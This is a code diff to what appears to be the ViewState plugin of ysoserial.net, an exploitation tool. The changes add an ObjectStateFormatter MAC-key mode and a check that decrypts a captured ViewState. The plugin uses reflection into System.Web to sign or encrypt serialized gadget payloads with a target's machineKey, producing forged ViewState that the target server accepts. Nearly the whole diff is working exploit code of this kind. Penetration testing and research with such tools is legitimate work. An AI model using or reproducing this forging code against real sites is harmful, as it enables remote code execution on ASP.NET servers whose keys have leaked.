@@ -1,5 +1,6 @@
 using NDesk.Options;
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Globalization;
@@ -9,6 +10,7 @@ using System.Reflection;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Web.Configuration;
+using System.Web.UI;
 using ysoserial.Generators;
 using ysoserial.Helpers;
 
@@ -51,6 +53,9 @@ namespace ysoserial.Plugins
         static string decryptionKey = "";
         static string validationAlg = "HMACSHA256";
         static string validationKey = "";
+        static bool isOSF = false;
+        static string macEncodingKey = "";
+        static string currentViewStateStr = "";
 
 
         Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
@@ -58,7 +63,7 @@ namespace ysoserial.Plugins
         string formatter = "losformatter";
         string payloadString = "";
         string shortestViewStateString = "/wEPZGQ="; // not in use at the moment but good to know!!!
-        string dryRunViewStateString = "/wEPDwUKMDAwMDAwMDAwMGRk"; // dryrun is currently disabled until we find a meaningful method to use the errors
+        string dryRunViewStateString = "/wEPDwUKMDAwMDAwMDAwMGRk"; 
 
         static OptionSet options = new OptionSet()
         {
@@ -81,9 +86,12 @@ namespace ysoserial.Plugins
             {"dk|decryptionkey=", "The decryptionKey attribute from machineKey in the web.config file.", v => decryptionKey = v },
             {"va|validationalg=", "The validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, or AES. Default: HMACSHA256.", v => validationAlg = v },
             {"vk|validationkey=", "The validationKey attribute from machineKey in the web.config file.", v => validationKey = v },
+            {"cv|currentviewstate=", "To validate and decrypt the provided viewstate value if it has been encrypted.", v => currentViewStateStr = v },
             {"showraw", "Stop URL-encoding the result. Default: false.", v => showraw = v != null },
             {"minify", "Minify the payloads where applicable (experimental). Default: false.", v => minify = v != null },
             {"ust|usesimpletype", "Remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true.", v => useSimpleType = v != null },
+            {"osf|objectstateformatter", "This is to smiluate ObjectStateFormatter with a MAC encoding key on its own.", v => isOSF = v != null },
+            {"mk|mackey=", "This is to set the ObjectStateFormatter MAC encoding key in base64 format.", v => macEncodingKey = v },
             {"isdebug", "Show useful debugging messages.", v => isDebug = v != null },
         };
 
@@ -238,8 +246,9 @@ namespace ysoserial.Plugins
 
             byte[] payload = System.Convert.FromBase64String(payloadString);
 
-            // we are settign the given machineKey parameters dynamically in this application to make the process easier
+            // we are setting the given machineKey parameters dynamically in this application to make the process easier
             // thanks to stackoverflow #18446385 for the tips!
+            // We probably can/should use the MachineKeyHelper methods to create a valid ViewState but the following is more natural as we are in .NET!
             object[] emptyArray = new object[] { };
 
             var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
@@ -249,14 +258,25 @@ namespace ysoserial.Plugins
             var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
             readOnlyField.SetValue(config, false);
 
-            if (validationAlg.ToUpper().Equals("3DES"))
+            // These enums are always capitalized
+            decryptionAlg = decryptionAlg.ToUpper(); // Except for Auto?
+            validationAlg = validationAlg.ToUpper(); // Except for TripleDES and Custom
+
+            if (validationAlg.Equals("TRIPLEDES")) { 
+                validationAlg = "TripleDES";
+            }else if (validationAlg.Equals("CUSTOM"))
+            {
+                validationAlg = "Custom";
+            }
+
+            if (validationAlg.Equals("3DES"))
             {
                 // If validationAlg is 3DES, modify it to TripleDES in order for Enum.Parse to work.
                 validationAlg = "TripleDES";
             }
 
             // we don't really need the encryption/decyption keys to create a valid legacy viewstate but this is used when isEncrypted=true
-            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (validationAlg.ToUpper().Equals("TRIPLEDES") || validationAlg.ToUpper().Equals("AES")) || (isLegacy && isEncrypted)))
+            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (validationAlg.Equals("TripleDES") || validationAlg.Equals("AES")) || (isLegacy && isEncrypted)))
             {
                 if (isDebug)
                 {
@@ -266,11 +286,26 @@ namespace ysoserial.Plugins
                 config.DecryptionKey = decryptionKey;
             }
 
+            byte[] currentViewStateBytes = null;
+            if (!string.IsNullOrEmpty(currentViewStateStr))
+            {
+                // URL Decoding the base64 value
+                currentViewStateStr = Regex.Replace(currentViewStateStr, "%2B", "+", RegexOptions.IgnoreCase);
+                currentViewStateStr = Regex.Replace(currentViewStateStr, "%2F", "/", RegexOptions.IgnoreCase);
+                currentViewStateStr = Regex.Replace(currentViewStateStr, "%3D", "=", RegexOptions.IgnoreCase);
+                currentViewStateStr = Regex.Replace(currentViewStateStr, " ", "+", RegexOptions.IgnoreCase);
+                currentViewStateStr = Regex.Replace(currentViewStateStr, "%20", "+", RegexOptions.IgnoreCase);
+
+                currentViewStateBytes = System.Convert.FromBase64String(currentViewStateStr);
+            }
+
 
 
             config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
 
-            if (validationKey.EndsWith(",IsolateApps"))
+            // TODO: implement ",IsolateByAppId" as well - but for it to make sense, we need to know the AppId and the Registry secret!
+            // TODO: the algorithm changes when app is null (when ObjectStateFormatter with a MAC encoding key is used directly)
+            if (validationKey.EndsWith(",IsolateApps", StringComparison.OrdinalIgnoreCase))
             {
                 validationKey = validationKey.Substring(0, validationKey.Length - ",IsolateApps".Length);
 
@@ -304,28 +339,62 @@ namespace ysoserial.Plugins
                 {
                     Console.WriteLine("Calculated new ValidationKey: " + validationKey);
                 }
-
             }
 
             config.ValidationKey = validationKey;
 
             readOnlyField.SetValue(config, true);
 
-            object finalPayload;
+            string finalPayload;
 
-            if (isLegacy)
+            if (isOSF)
             {
-                finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload);
+                finalPayload = LocalObjectStateFormatter(payload, macEncodingKey);
+            }
+            else if (isLegacy)
+            {
+                finalPayload = GenerateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload, currentViewStateBytes);
             }
             else
             {
-                finalPayload = generateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, viewStateUserKey, payload);
+                finalPayload = GenerateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, viewStateUserKey, payload, currentViewStateBytes);
             }
 
+            if (!showraw)
+            {
+                // URL-encoding the base64 value - supporting long values
+                finalPayload = finalPayload.Replace("+", "%2B")
+                         .Replace("/", "%2F")
+                         .Replace("=", "%3D");
+            }
             return finalPayload;
         }
 
-        private object generateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload)
+        private string LocalObjectStateFormatter(byte[] payload, string macEncodingKeyBase64)
+        {
+            return LocalObjectStateFormatter(payload, System.Convert.FromBase64String(macEncodingKeyBase64));
+        }
+        private string LocalObjectStateFormatter(byte[] payload, byte[] macEncodingKey)
+        {
+            if (macEncodingKey == null)
+            {
+                throw new ArgumentNullException("macEncodingKey should not be null! If it is null, just use LosFormatter!");
+            }
+            
+            // Not used in legacy when MAC encoding key is used with ObjectStateFormatter
+            //var _purposeStr = "User.ObjectStateFormatter.Serialize";
+
+            var getterGetEncodedData = typeof(MachineKeySection).GetMethod("GetEncodedData", BindingFlags.Static | BindingFlags.NonPublic);
+            var byteResult = (byte[])getterGetEncodedData.Invoke(null, new object[] { payload, macEncodingKey, 0, payload.Length });
+
+            return System.Convert.ToBase64String(byteResult);
+        }
+
+        private string GenerateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload)
+        {
+            return GenerateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPath, isEncrypted, viewStateUserKey, payload, null);
+        }
+        private string GenerateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload, byte[] currentViewStateBytes)
         {
             var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
             var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);
@@ -339,8 +408,8 @@ namespace ysoserial.Plugins
             {
                 // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
                 // This is where the path is important
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
                 pageHashCode = (uint)pageHashCodeTemp;
 
                 if (isDebug)
@@ -354,8 +423,8 @@ namespace ysoserial.Plugins
                 // this just for debugging to ensure the __VIEWSTATEGENERATOR matches the calculation
                 // this can also be used to identify the correct path and apppath parameters using trial and error
                 Console.WriteLine("Provided __VIEWSTATEGENERATOR in uint: " + parsedViewstateGeneratorIdentifier);
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
                 Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCodeTemp);
                 if (parsedViewstateGeneratorIdentifier != (uint)pageHashCodeTemp)
                 {
@@ -381,23 +450,63 @@ namespace ysoserial.Plugins
             byte[] byteResult;
             if (!isEncrypted)
             {
+
                 var getterGetEncodedData = typeof(MachineKeySection).GetMethod("GetEncodedData", BindingFlags.Static | BindingFlags.NonPublic);
                 byteResult = (byte[])getterGetEncodedData.Invoke(null, new object[] { payload, _macKeyBytes, 0, payload.Length });
+
+                if (currentViewStateBytes != null)
+                {
+                    try
+                    {
+                        var getterGetDecodedData = typeof(MachineKeySection).GetMethod("GetDecodedData", BindingFlags.Static | BindingFlags.NonPublic);
+                        byte[] decodedByteResult;
+                        int dummy = 0;
+                        decodedByteResult = (byte[])getterGetDecodedData.Invoke(null, new object[] { currentViewStateBytes, _macKeyBytes, 0, currentViewStateBytes.Length, dummy });
+                        Console.WriteLine("Provided viewstate is good with the provided keys and algorithms. :) ");
+                        Console.WriteLine("Decoded value in text: " + Encoding.UTF8.GetString(decodedByteResult));
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Failed to validate the provided viewstate with the provided keys and algorithms. :( ");
+                    }
+                }
             }
             else
             {
                 var getterEncryptOrDecryptData = typeof(MachineKeySection).GetMethod("EncryptOrDecryptData", BindingFlags.Static | BindingFlags.NonPublic, null,
                 new Type[] { typeof(bool), typeof(byte[]), typeof(byte[]), typeof(int), typeof(int) }, null);
                 byteResult = (byte[])getterEncryptOrDecryptData.Invoke(null, new object[] { true, payload, _macKeyBytes, 0, payload.Length });
+
+                if (currentViewStateBytes != null)
+                {
+                    try
+                    {
+                        byte[] decryptedByteResult;
+                        decryptedByteResult = (byte[])getterEncryptOrDecryptData.Invoke(null, new object[] { false, currentViewStateBytes, _macKeyBytes, 0, currentViewStateBytes.Length });
+
+                        Console.WriteLine("Provided viewstate is good with the provided keys and algorithms. :) ");
+                        Console.WriteLine("Decrypted value in text: " + Encoding.UTF8.GetString(decryptedByteResult));
+                        Console.WriteLine("Decrypted value in base64: " + System.Convert.ToBase64String(decryptedByteResult));
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("Failed to decrypt the provided viewstate with the provided keys and algorithms.");
+                    }
+                }
             }
 
+            
+
             string outputBase64 = System.Convert.ToBase64String(byteResult);
-            if (!showraw)
-                outputBase64 = Uri.EscapeDataString(outputBase64);
             return outputBase64;
         }
 
-        private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
+        private string GenerateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
+        {
+            return GenerateViewState_4dot5(targetPagePath, IISAppInPath, viewStateUserKey, payload, null);
+        }
+
+        private string GenerateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload, byte[] currentViewStateBytes)
         {
             if (isDebug)
             {
@@ -406,8 +515,8 @@ namespace ysoserial.Plugins
                 // This is where the path is important
                 var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
                 var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);
-                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
-                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
+                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName), true });
+                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName), true });
                 uint pageHashCode = (uint)pageHashCodeTemp;
 
                 Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCode);
@@ -428,8 +537,8 @@ namespace ysoserial.Plugins
 
             // This is where the path is important
             string[] specificPurposes = new String[] {
-                    "TemplateSourceDirectory: " + simulateTemplateSourceDirectory(targetPagePath, pathIsClassName).ToUpperInvariant(),
-                    "Type: " + simulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName).ToUpperInvariant()
+                    "TemplateSourceDirectory: " + SimulateTemplateSourceDirectory(targetPagePath, pathIsClassName).ToUpperInvariant(),
+                    "Type: " + SimulateGetTypeName(targetPagePath, IISAppInPath, pathIsClassName).ToUpperInvariant()
                 };
 
             // viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
@@ -454,19 +563,27 @@ namespace ysoserial.Plugins
             var protectMethod = cryptoServiceClass.GetType().GetMethod("Protect");
             byte[] byteResult = (byte[])protectMethod.Invoke(cryptoServiceClass, new object[] { payload });
 
-            string outputBase64 = System.Convert.ToBase64String(byteResult);
-            if (!showraw)
+            if (currentViewStateBytes != null)
             {
-                // URL-encoding the base64 value - supporting long values
-                outputBase64 = outputBase64.Replace("+", "%2B")
-                         .Replace("/", "%2F")
-                         .Replace("=", "%3D");
+                try
+                {
+                    var unprotectMethod = cryptoServiceClass.GetType().GetMethod("Unprotect");
+                    byte[] decryptedByteResult = (byte[])unprotectMethod.Invoke(cryptoServiceClass, new object[] { currentViewStateBytes });
+
+                    Console.WriteLine("Decrypted value in text: " + Encoding.UTF8.GetString(decryptedByteResult));
+                    Console.WriteLine("Decrypted value in base64: " + System.Convert.ToBase64String(decryptedByteResult));
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("Decryption of provided viewstate failed: " + e.Message);
+                }
             }
 
+            string outputBase64 = System.Convert.ToBase64String(byteResult);
             return outputBase64;
         }
 
-        private String simulateTemplateSourceDirectory(String strPath, bool isClassName)
+        private String SimulateTemplateSourceDirectory(String strPath, bool isClassName)
         {
             String result = strPath;
 
@@ -492,7 +609,7 @@ namespace ysoserial.Plugins
             return result;
         }
 
-        private String simulateGetTypeName(String strPath, String IISAppInPath, bool isClassName)
+        private String SimulateGetTypeName(String strPath, String IISAppInPath, bool isClassName)
         {
 
             if (!strPath.StartsWith("/"))
